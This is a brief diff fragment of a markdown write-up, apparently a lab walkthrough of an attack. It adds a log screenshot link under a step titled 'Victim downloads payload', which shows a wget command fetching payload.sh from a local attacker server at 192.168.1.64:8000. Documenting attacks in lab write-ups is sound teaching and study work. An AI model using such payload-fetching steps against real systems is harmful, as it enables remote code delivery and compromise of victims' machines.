@@ -59,6 +59,8 @@ Confirms:
 
 Victim downloads payload:
 
+![Ubuntu Logs](images/ma1.png)
+
 ```bash
 wget http://192.168.1.64:8000/payload.sh
 ```
